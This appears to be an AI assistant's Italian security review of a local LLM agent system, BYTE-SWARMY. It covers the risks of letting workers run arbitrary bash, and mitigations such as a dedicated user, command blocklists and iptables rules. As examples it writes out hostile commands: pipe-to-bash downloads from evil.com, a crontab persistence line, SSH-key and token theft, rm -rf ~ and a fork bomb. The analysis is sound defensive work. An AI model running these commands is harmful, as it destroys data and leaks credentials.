@@ -1,0 +1,315 @@
+Domanda seria, ti do una risposta seria e tecnica. BYTE-SWARMY ha **rischi reali** che devi conoscere.
+
+## Analisi dei rischi — onesta
+
+### 🔴 RISCHI ALTI (cosa può fare danno reale)
+
+#### 1. Il worker può eseguire QUALSIASI comando bash
+
+Nel `tools.py`, il tool `run_bash(cmd)` passa il comando a `subprocess.run(["bash", "-c", cmd])` con i **tuoi permessi utente**. L'LLM può eseguire:
+
+```bash
+# Cose innocue che già fa
+gcc project/hello.c -o project/hello
+
+# Cose dannose che PUÒ fare se gli viene in mente
+rm -rf ~                          # cancella la home
+rm -rf ~/Documents                # cancella documenti
+curl evil.com/malware.sh | bash   # scarica malware
+ssh attacker@host 'cat /etc/passwd'  # esfiltra dati
+chmod -R 777 ~                    # cambia permessi
+# scrive in /etc/cron.d/ se hai sudo senza password
+crontab -l | { cat; echo "* * * * * curl evil.com/x | bash"; } | crontab -
+```
+
+**Non è teorico**: i modelli piccoli (1B-3B) a volte producono output imprevedibili, specialmente quando:
+- Il prompt è ambiguo
+- Vedono errori e tentano "fix" creativi
+- Vanno in loop e provano comandi sempre più aggressivi
+
+#### 2. Il worker può scrivere file ovunque tu abbia accesso
+
+`write_file(path, content)` ha un check che blocca path fuori da `project_root`:
+
+```python
+# in tools.py _resolve()
+try:
+    full.relative_to(self.project_root.resolve())
+except ValueError:
+    raise ValueError(f"path outside project_root: {path}")
+```
+
+MA questo protegge solo `write_file`. **Non protegge `run_bash`**:
+
+```bash
+# Il worker può fare:
+run_bash("echo 'malware' > ~/.bashrc")
+run_bash("echo 'malware' > ~/.config/autostart/evil.desktop")
+run_bash("cat /etc/shadow > project/leak.txt")  # se hai permessi
+```
+
+#### 3. Il worker può fare `git push` (se configurato)
+
+I tool Git includono `git_push(remote, branch)`. Se il token è in `~/.git-credentials`, l'LLM può:
+
+```bash
+git_push("origin", "main")  # pusha codice sul tuo GitHub
+```
+
+Peggio, può fare `git_remote("add", "evil", "https://attacker.com/repo.git")` e pushare lì.
+
+#### 4. Il worker può scaricare cose da internet
+
+```bash
+run_bash("curl -o project/malware https://evil.com/payload")
+run_bash("wget -O - https://evil.com/install.sh | bash")
+```
+
+### 🟡 RISCHI MEDI
+
+#### 5. RAM/CPU — saturazione
+
+L'LLM può chiedere `run_bash("yes > /dev/null & yes > /dev/null & ...")` o creare loop infiniti. Hai già Timestral che protegge dalla CPU, ma:
+- Timestral monitora la CPU total, non i singoli processi fork-bomb
+- Un `fork bomb` classico (`:(){ :|: & };:`) può crashare il sistema in 5 secondi, prima che Timestral se ne accorga
+
+#### 6. Disco — saturazione
+
+```bash
+run_bash("dd if=/dev/zero of=project/big bs=1M count=100000")  # 100 GB
+```
+
+Riempie il disco. Hai un check `disk_free_threshold = 1 GB`, ma è nel `_check_resources()` dell'orchestratore che gira ogni 30s — troppo lento se il comando è rapido.
+
+#### 7. Esposizione dati sensibili
+
+```bash
+run_bash("cat ~/.ssh/id_rsa >> project/leak.py")
+run_bash("env >> project/leak.py")  # var d'ambiente con token
+run_bash("cat ~/.git-credentials >> project/leak.py")  # IL TUO PAT GitHub!
+```
+
+Poi se fai `./sync.sh` → finisce tutto su GitHub pubblico.
+
+### 🟢 RISCHI BASSI (gestiti)
+
+- **Path traversal** in `write_file`: bloccato ✓
+- **Modelli carichi in RAM**: rotation corretta, niente leak tra agenti ✓
+- **Stato su file JSON**: atomico, niente corruzione ✓
+- **SIGTERM**: shutdown pulito con unload modelli ✓
+
+## Mitigazioni ATTIVE attuali
+
+| Cosa | Come | Efficacia |
+|---|---|---|
+| Path traversal in `write_file` | `_resolve()` blocca path fuori `project_root` | ✅ Buona, ma solo per write_file |
+| Timeout bash | `timeout_bash = 30` secondi | ⚠️ Limita singolo comando, non catene |
+| RAM monitor | `_check_resources()` ogni 30s, pausa se >80% | ⚠️ Lento, non previene fork bomb |
+| Disco monitor | `_check_resources()` ogni 30s | ⚠️ Lento |
+| Timestral | Pausa termica >90°C | ✅ Buona |
+| Max 10 fallimenti | Task va in `stuck` | ✅ Buona per loop, non per danno immediato |
+
+## Cosa MANCA — mitigazioni raccomandate
+
+Per usare BYTE-SWARMY in modo sicuro, dovresti aggiungere queste protezioni:
+
+### 🔴 Massima priorità — Sandboxing
+
+#### Opzione A (più sicura, raccomandata): container Docker
+
+Crea un container che esegue l'orchestratore, con:
+- Filesystem read-only su tutto tranne `project/`
+- Nessun accesso a `~/.ssh`, `~/.git-credentials`, `~/.bashrc`
+- Limite di RAM (4 GB), CPU (2 core), disco (10 GB)
+- Nessun accesso a `/etc`, `/var`, `/root`
+- Network limitato (solo `localhost:11434` per Ollama, niente internet per i worker)
+
+#### Opzione B (mediana): user dedicato senza privilegi
+
+Crea un utente Linux `byteswarmy` senza sudo, senza accesso alla tua home, con home propria:
+
+```bash
+sudo useradd -m -s /bin/bash byteswarmy
+sudo chmod 700 /home/byteswarmy
+# Sposta byte-swarmy in /home/byteswarmy/byte-swarmy
+# Lancia orchestratore come byteswarmy
+sudo -u byteswarmy ./avvia.sh
+```
+
+Così anche se il worker fa `rm -rf ~`, cancella solo `/home/byteswarmy/`, non la tua roba.
+
+#### Opzione C (minima): whitelist comandi bash
+
+Modifica `tools.py` per validare i comandi prima di eseguirli:
+
+```python
+# Lista di comandi permessi (regex)
+ALLOWED_BASH = [
+    r"^gcc\s",
+    r"^python\d*\s+project/",
+    r"^cd\s+project",
+    r"^ls\s",
+    r"^cat\s+project/",
+    r"^mkdir\s+project/",
+    r"^grep\s",
+    r"^find\s+project",
+    r"^git\s+(add|commit|status|diff|log)\b",
+]
+
+# Comandi BLOCCATI (sempre)
+BLOCKED_BASH = [
+    r"\brm\s+-rf\b",
+    r"\bsudo\b",
+    r"\bcurl\b",
+    r"\bwget\b",
+    r"\bssh\b",
+    r"\bscp\b",
+    r"\bchmod\b",
+    r"\bchown\b",
+    r"/etc/",
+    r"/var/",
+    r"/root/",
+    r"~/.ssh",
+    r"~/.git-credentials",
+    r"\$\(",  # command substitution
+    r"\bsource\b",
+    r"\beval\b",
+    r"crontab",
+    r"autostart",
+    r"\.bashrc",
+    r"\.profile",
+]
+```
+
+### 🔴 Altra priorità — Rimuovi git_push dal worker
+
+I worker non dovrebbero MAI poter pushare su GitHub. Modifica `tools.py`:
+
+```python
+def git_push(self, remote: str = "origin", branch: str = "") -> str:
+    """DISABILITATO per sicurezza — i worker non pushano."""
+    return "ERROR: git_push disabled for workers (use sync.sh manually)"
+```
+
+Stesso per `git_pull`, `git_remote` (almeno il `add`).
+
+### 🟡 Priorità media — Network policy
+
+Blocca l'accesso a internet per i worker:
+
+```bash
+# iptables rules (da eseguire con sudo)
+sudo iptables -A OUTPUT -m owner --uid-owner $(id -u) -p tcp --dport 80 -j DROP
+sudo iptables -A OUTPUT -m owner --uid-owner $(id -u) -p tcp --dport 443 -j DROP
+# eccetto localhost per Ollama
+sudo iptables -A OUTPUT -m owner --uid-owner $(id -u) -d 127.0.0.1 -p tcp --dport 11434 -j ACCEPT
+```
+
+Oppure usa un proxy che permette solo `localhost:11434`.
+
+## Cosa fare ORA — raccomandazioni pratiche
+
+### 1. Backup delle cose importanti PRIMA di usare il sistema
+
+```bash
+# Backup SSH keys, git credentials, documenti
+mkdir -p ~/byte-swarmy-backup
+cp -r ~/.ssh ~/byte-swarmy-backup/
+cp ~/.git-credentials ~/byte-swarmy-backup/ 2>/dev/null
+cp -r ~/Documents ~/byte-swarmy-backup/  # se hai spazio
+
+# Verifica
+ls ~/byte-swarmy-backup/
+```
+
+### 2. Crea user dedicato (15 min, vale la pena)
+
+```bash
+# Crea user senza sudo
+sudo useradd -m -s /bin/bash byteswarmy
+sudo passwd byteswarmy  # metti una password
+
+# Copia il progetto nella home del nuovo user
+sudo cp -r ~/Desktop/byte-swarmy /home/byteswarmy/
+sudo chown -R byteswarmy:byteswarmy /home/byteswarmy/byte-swarmy
+
+# Lancia come byteswarmy
+sudo -u byteswarmy -i
+cd /home/byteswarmy/byte-swarmy
+./avvia.sh
+```
+
+Così:
+- ✅ Il worker non può leggere `~/.ssh`, `~/.git-credentials`, `~/Documents`
+- ✅ Se fa `rm -rf ~`, cancella solo `/home/byteswarmy/` (rifacibile)
+- ✅ Non può fare sudo (niente apt, niente modifiche di sistema)
+
+### 3. Disabilita git_push nel worker
+
+Modifica `tools.py`:
+
+```python
+def git_push(self, remote: str = "origin", branch: str = "") -> str:
+    """DISABILITATO — i worker non pushano. Usa sync.sh manualmente."""
+    return "ERROR: git_push is disabled. Use ./sync.sh from your user."
+```
+
+### 4. Non usare mai il token GitHub nel config
+
+Verifica che il token sia solo in `~/.git-credentials` e NON nel `config.toml` o in file del progetto:
+
+```bash
+grep -r "ghp_" ~/Desktop/byte-swarmy/ 2>/dev/null
+# Non deve trovare nulla
+```
+
+### 5. Se usi MCP con server esterni — verifica la fonte
+
+I server MCP che configuri possono inviare task arbitrari. Solo server MCP fidati!
+
+## Tabella riassuntiva — rischio vs mitigazione
+
+| Rischio | Probabilità | Impatto | Mitigazione attuale | Mitigazione raccomandata |
+|---|---|---|---|---|
+| `rm -rf` cartelle utente | Media | Alto | ❌ Nessuna | User dedicato + sandbox |
+| Scaricare malware | Media | Alto | ❌ Nessuna | iptables + user dedicato |
+| Rubare SSH keys/token | Alta | Critico | ❌ Nessuna | User dedicato (non legge ~/) |
+| Fork bomb | Bassa | Medio | ⚠️ Timeout 30s | ulimit + cgroups |
+| Push codice malevolo GitHub | Bassa | Alto | ❌ worker può pushare | Disabilita git_push nel worker |
+| Saturazione disco | Media | Medio | ⚠️ Check ogni 30s | quota disco |
+| Esposizione env vars | Alta | Medio | ❌ Nessuna | User dedicato + env pulito |
+
+## Risposta diretta alla tua domanda
+
+> "Può creare danno al sistema operativo?"
+
+**Sì, può.** Nello stato attuale:
+
+1. **Danni al sistema operativo (kernel, /etc, /usr)**: DIFFICILE perché non hai sudo nei worker (girano come tuo user), ma non impossibile se hai sudo senza password configurato.
+
+2. **Danni alla tua home utente**: FACILE. Il worker può cancellare `~/Documents`, `~/.ssh`, `~/Pictures`, `~/.config`, ecc.
+
+3. **Danni al codice GitHub**: POSSIBILE. Il worker può pushare codice sul tuo repo.
+
+4. **Esfiltrazione dati**: FACILE. SSH keys, token GitHub, documenti possono finire in `project/` e poi su GitHub pubblico.
+
+## Raccomandazione finale
+
+**NON usare BYTE-SWARMY in produzione senza prima aver fatto ALMENO queste 3 cose:**
+
+1. ✅ User dedicato `byteswarmy` senza sudo
+2. ✅ Disabilitare `git_push` nel worker
+3. ✅ Backup di `~/.ssh`, `~/.git-credentials`, documenti importanti
+
+Per uso personale su PC di test dove non hai dati sensibili → rischio accettabile, ma stai attento.
+
+Per uso su PC con dati reali (lavoro, banking, documenti) → **OBBLIGATORIO** user dedicato + sandbox.
+
+Vuoi che prepari uno script `setup-secure.sh` che:
+1. Crea l'utente `byteswarmy`
+2. Copia il progetto
+3. Disabilita `git_push` nel worker
+4. Configura iptables per bloccare internet al worker
+5. Imposta quota disco
+
+Dimmi se lo vuoi e lo preparo.
